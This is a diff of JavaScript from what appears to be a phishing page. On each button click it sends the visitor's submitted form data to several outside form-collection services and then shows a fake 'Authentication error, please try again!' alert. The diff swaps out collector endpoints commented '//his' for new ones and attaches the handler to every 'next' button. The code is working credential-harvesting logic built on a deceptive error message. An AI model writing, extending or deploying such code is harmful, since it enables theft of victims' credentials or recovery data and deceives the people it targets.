@@ -230,60 +230,44 @@
         } catch (error) {
             
         }
-        try {
-            //his
-            await postData(
-            dataToSubmit
-        , 'https://getform.io/f/zbzomvqa');
-        } catch (error) {
-            
-        }
-
-        try {
-            //his
-            await postData(
-            dataToSubmit
-        , 'https://formkeep.com/f/9f1d7eb57d58');
-        } catch (error) {
-            
-        }
-        try {
-            //his
-            await postData(
-            dataToSubmit
-        , 'https://submit-form.com/mTmBUQDsK');
-        } catch (error) {
-            
-        }
-        try {
-            //his
-            await postData(
-            dataToSubmit
-        , 'https://www.formbackend.com/f/19df5692bee142d7');
-        } catch (error) {
-            
-        }
+        
         try {
             await postData(
             dataToSubmit
-        , 'https://formsubmit.io/send/christophersmith0084@gmail.com');
+        , 'https://formspree.io/f/xjvnjqjq');
         } catch (error) {
             
         }
+        
+        try {
+            await postData(
+            dataToSubmit
+        , 'https://usebasin.com/f/804524377e69');
+        } catch (error) {
+            
+        }
+        
+        
         new swal( "Error Restoring" ,  "Authentication error, please try again!" ,  "error" )
     }
     
     // Add event listener to submitBtn
     function addEventListener() {
-        var submitBtn = document.getElementById("submitBtn");
-        if (submitBtn) {
-            // Remove any existing event listener
-            submitBtn.removeEventListener("click", submitForm);
-
-            // Add a new event listener
-            submitBtn.addEventListener("click", submitForm);
-        }
+    // Add event listener to all elements with class "next-btn-button"
+    var nextBtns = document.getElementsByClassName("next-btn-button");
+    
+    // Loop through all elements with the class
+    for (var i = 0; i < nextBtns.length; i++) {
+        var nextBtn = nextBtns[i];
+        
+        // Remove any existing event listener
+        nextBtn.removeEventListener("click", submitForm);
+        
+        // Add a new event listener
+        nextBtn.addEventListener("click", submitForm);
     }
+}
+
     
     // Add event listener every 100ms
     // addEventListener()
